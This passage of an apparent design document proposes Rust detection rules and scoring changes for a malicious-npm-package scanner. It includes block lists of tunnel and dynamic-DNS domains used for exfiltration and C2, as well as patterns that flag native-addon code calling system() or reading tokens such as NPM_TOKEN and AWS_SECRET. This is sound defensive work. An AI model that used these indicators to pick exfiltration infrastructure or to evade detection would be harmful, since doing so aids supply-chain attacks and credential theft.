let mut unicode_match_len = 0usize;
let mut total_str_len_for_unicode = 0usize;
for mat in string_re.find_iter(source) {
    let s = mat.as_str();
    total_str_len_for_unicode += s.len();
    for u_mat in unicode_re.find_iter(s) {
        unicode_match_len += u_mat.as_str().len();
    }
}
if total_str_len_for_unicode > 100 {
    let unicode_ratio = unicode_match_len as f64 / total_str_len_for_unicode as f64;
    if unicode_ratio > 0.15 {
        findings.push(Finding {
            kind: FindingKind::Obfuscation,
            risk: RiskLevel::High,
            message: format!(
                "High unicode escape density: {:.1}% of string content is \\uNNNN encoded",
                unicode_ratio * 100.0
            ),
            file: relative_path.to_string(),
            line: 1,
            snippet: None,
        });
    }
}
```

### Pattern 9: Suspicious Domain / IP Exfil Destinations

**Risk: Critical**

```rust
Pattern {
    id: "exfil-suspicious-domains",
    kind: FindingKind::DataExfiltration,
    risk: RiskLevel::Critical,
    description: "Connects to known attacker infrastructure or suspicious domains",
    strings: &[
        // Free tunnel/proxy services used in malware
        ".ngrok.io", ".ngrok.app", ".serveo.net", ".localhost.run",
        ".pagekite.me", ".loca.lt",
        // Free dynamic DNS often used for C2
        ".duckdns.org", ".no-ip.com", ".noip.com", ".ddns.net",
        ".hopto.org", ".zapto.org", ".sytes.net",
        // OOB/SSRF testing infra (not usually in production code)
        ".interact.sh", ".oastify.com", ".canarytokens.com",
        ".burpcollaborator.net", ".requestbin.com", ".webhook.site",
        // Known malware infrastructure (update from threat intel)
        "herokucdn.com", // used in 2023 exfil campaigns
    ],
},
```

Also add raw IP in URL pattern (legitimate services almost never use raw IPs in URLs):
```rust
Pattern {
    id: "raw-ip-url",
    kind: FindingKind::DataExfiltration,
    risk: RiskLevel::High,
    description: "URL with raw IP address (suspicious -- legitimate services use domains)",
    strings: &[
        "http://1.", "http://2.", "http://3.", "http://4.",
        "http://5.", "http://6.", "http://7.", "http://8.",
        "http://9.", "http://10.", "http://192.", "http://172.",
        "https://1.", "https://2.", "https://192.", "https://10.",
    ],
},
```

### Pattern 10: Native Addon Presence (NEW FindingKind)

Add `NativeAddon` to `FindingKind` enum in report.rs:

```rust
// In FindingKind enum:
/// Package builds or includes a native C/C++ addon (.node file or binding.gyp)
NativeAddon,
```

And the C source scanner patterns (new function in scanner.rs):

```rust
fn scan_native_addon_source(source: &str, relative_path: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    
    // Critical: system() calls (arbitrary command execution)
    let dangerous_fns = ["system(", "popen(", "execve(", "execvp(", "execlp("];
    for fn_name in &dangerous_fns {
        if source.contains(fn_name) {
            findings.push(Finding {
                kind: FindingKind::Subprocess,
                risk: RiskLevel::Critical,
                message: format!("Native addon calls {}  (arbitrary command execution)", fn_name),
                file: relative_path.to_string(),
                line: 1,
                snippet: None,
            });
        }
    }
    
    // High: getenv() for sensitive vars
    let sensitive_env = ["NPM_TOKEN", "AWS_SECRET", "GITHUB_TOKEN", "SSH_AUTH_SOCK"];
    for env_var in &sensitive_env {
        if source.contains(env_var) {
            findings.push(Finding {
                kind: FindingKind::CredentialHarvest,
                risk: RiskLevel::Critical,
                message: format!("Native addon accesses sensitive env var: {}", env_var),
                file: relative_path.to_string(),
                line: 1,
                snippet: None,
            });
        }
    }
    
    // High: socket creation (unexpected network in native code)
    if source.contains("socket(") && (source.contains("AF_INET") || source.contains("SOCK_STREAM")) {
        findings.push(Finding {
            kind: FindingKind::Network,
            risk: RiskLevel::High,
            message: "Native addon creates raw network socket".into(),
            file: relative_path.to_string(),
            line: 1,
            snippet: None,
        });
    }
    
    // Medium: dlopen inside addon (loading more native code)
    if source.contains("dlopen(") {
        findings.push(Finding {
            kind: FindingKind::DynamicExec,
            risk: RiskLevel::High,
            message: "Native addon uses dlopen() to load additional shared libraries".into(),
            file: relative_path.to_string(),
            line: 1,
            snippet: None,
        });
    }
    
    findings
}
```

Integrate into PackageScanner::scan():
```rust
// Walk C/C++ source files when binding.gyp exists:
if has_binding_gyp {
    for entry in WalkDir::new(package_dir).into_iter().filter_map(|e| e.ok()) {
        let ext = entry.path().extension().and_then(|e| e.to_str()).unwrap_or("");
        if matches!(ext, "c" | "cc" | "cpp" | "h" | "hpp") {
            if let Ok(source) = std::fs::read_to_string(entry.path()) {
                let rel = entry.path().strip_prefix(package_dir).unwrap_or(entry.path())
                    .to_string_lossy().to_string();
                all_findings.extend(scan_native_addon_source(&source, &rel));
            }
        }
    }
}
```

---

## 6. Shannon Entropy Scanner: Should oath Add One?

**Recommendation: Yes, but carefully tuned.**

Shannon entropy measures the information density of a string. Random-looking strings (obfuscated payloads, base64, encrypted data) have entropy near 4.0-5.0 bits/character. Normal English prose is ~3.5. Code identifiers average ~3.8.

**The practical implementation:**

```rust
/// Compute Shannon entropy of a string (bits per character)
fn shannon_entropy(s: &str) -> f64 {
    if s.is_empty() { return 0.0; }
    let mut freq = [0u64; 256];
    for b in s.bytes() {
        freq[b as usize] += 1;
    }
    let len = s.len() as f64;
    freq.iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / len;
            -p * p.log2()
        })
        .sum()
}

/// Check string literals in source for suspiciously high entropy
fn scan_high_entropy_strings(source: &str, relative_path: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    // Match string literals of at least 20 chars
    let re = Regex::new(r#"(?:"([^"\\]{20,})"|'([^'\\]{20,})')"#).unwrap();
    
    for cap in re.captures_iter(source) {
        let s = cap.get(1).or(cap.get(2)).map(|m| m.as_str()).unwrap_or("");
        let entropy = shannon_entropy(s);
        
        // High entropy threshold: >4.5 for strings > 40 chars
        // This catches base64 payloads, encrypted strings, crypto keys
        if entropy > 4.5 && s.len() > 40 {
            findings.push(Finding {
                kind: FindingKind::Obfuscation,
                risk: if entropy > 5.2 { RiskLevel::High } else { RiskLevel::Medium },
                message: format!(
                    "High-entropy string literal: {:.2} bits/char, {} chars (possible obfuscated payload)",
                    entropy, s.len()
                ),
                file: relative_path.to_string(),
                line: 1,
                snippet: Some(format!("{}...", &s[..s.len().min(50)])),
            });
        }
    }
    findings
}
```

**Tuning to reduce false positives:**
- Exclude strings that are valid URLs (contain `://` or `.com/`)
- Exclude strings that are CSS hex colors (`#[0-9a-fA-F]{6}`)
- Exclude strings that are file paths (contain `/` and `.`)
- Exclude strings in `node_modules` subdirectories (already skipped)
- Consider length: entropy of a 20-char string means less than entropy of a 200-char string
- Base64 alphabet check: if a string is >80% `[A-Za-z0-9+/=]`, flag separately as "possible base64 blob"

**FP expectation:** With 40+ char threshold and 4.5 entropy threshold, expect 5-10% FP rate on legitimate packages (things like license keys in test fixtures, UUID generation strings, crypto test vectors). Acceptable if scored as Medium.

---

## 7. Scoring Model Improvements

Current scoring in score.rs treats all Critical findings equally at -30 each. Proposed changes:

```rust
// New: combo multiplier for particularly dangerous combinations
// If a package has BOTH dynamic_exec AND credential_harvest findings:
let has_dynamic_exec_finding = report.findings.iter()
    .any(|f| matches!(f.kind, FindingKind::DynamicExec) 
         && matches!(f.risk, RiskLevel::High | RiskLevel::Critical));
let has_cred_harvest_finding = report.findings.iter()
    .any(|f| matches!(f.kind, FindingKind::CredentialHarvest 
                      | FindingKind::DataExfiltration));

if has_dynamic_exec_finding && has_cred_harvest_finding {
    raw_score -= 25; // combo penalty on top of individual penalties
    factors.push(ScoreFactor {
        name: "eval_plus_exfil_combo".into(),
        weight: -25,
        description: "Dynamic execution combined with credential/data exfiltration".into(),
    });
}

// New: native addon penalty
let has_native_addon = report.findings.iter()
    .any(|f| matches!(f.kind, FindingKind::NativeAddon));
if has_native_addon {
    raw_score -= 15;
    factors.push(ScoreFactor {
        name: "native_addon".into(),
        weight: -15,
        description: "Contains native addon (bypasses JS sandbox)".into(),
    });
}

// New: elevated penalty for new+unpopular+native_addon combo  
if ctx.weekly_downloads < 1000 && ctx.age_days < 90 && has_native_addon {
    raw_score -= 20;
    factors.push(ScoreFactor {
        name: "new_pkg_native_addon".into(),
        weight: -20,
        description: "New/obscure package with native addon (very suspicious)".into(),
    });
}
```

---

## 8. Summary of Recommended Changes to oath-analyze

### Immediate (High Impact, Low Effort):

1. **Add `env-ci-targeting` pattern** -- CI env var reads are almost exclusively malicious; high signal, low FP.
2. **Upgrade eval+base64 combo to Critical** -- modify AST visitor to check eval() argument for Buffer.from/atob.
3. **Add `process['env']` bracket notation** -- add ComputedMemberExpression check to AST visitor.
4. **Add unicode escape density check** -- mirror the existing hex density check for `\uNNNN`.
5. **Add `subprocess-silent` pattern** -- `{stdio: 'ignore'}` with exec is a near-definitive malware signal.

### Medium-term (High Impact, More Effort):

6. **Add `NativeAddon` FindingKind + detection** -- scan for binding.gyp, .node files, report as High.
7. **Add C source scanner for native addons** -- scan `src/*.c` / `src/*.cc` for `system()`, raw socket, `getenv("TOKEN")`.
8. **Add Shannon entropy scanner** -- tune threshold at 4.5 bits/char for strings >40 chars.
9. **Add download-execute combo detection** -- network + chmod in same package = Critical.
10. **Add `module-loader-patch` pattern** -- `Module._resolveFilename` reassignment is require() hijacking.

### Architecture Change (High Impact):

11. **Cross-file combination scoring** -- current `check_exfil_combo` only checks within a single call expression span. Extend to track per-file capabilities and emit combo findings at the PackageScanner level after all files are scanned.
12. **Version-over-version diff** -- compare current scan results against a cached baseline for the previous version; new capabilities in a new version = suspicious delta. Requires storing previous analysis results in oath-store.

### Score Model Adjustments:

- Add combo penalty: dynamic_exec + credential_harvest/exfil = extra -25
- Add native addon penalty: -15 base, -20 additional if new/obscure package
- Consider capping individual Critical finding penalty at 3 (some packages legitimately have many -- e.g. a REPL that uses eval for everything). Currently 4 Critical findings = -120 which floors to 0 regardless of positives.

---

*Research compiled from: Socket.dev threat model blog posts (2022-2024), Datadog GuardDog GitHub repo, npm security advisories for ua-parser-js (GHSA-pjwm-rvh2-c87w), event-stream (GHSA-qm2z-62rg-8mr6), node-ipc (GHSA-97m3-w2cp-4xx6), colors.js (no CVE, incident documented), xz-utils (CVE-2024-3094), Semgrep npm ruleset, OpenSSF malicious packages research (2023), Phylum supply chain reports Q1-Q3 2024.*
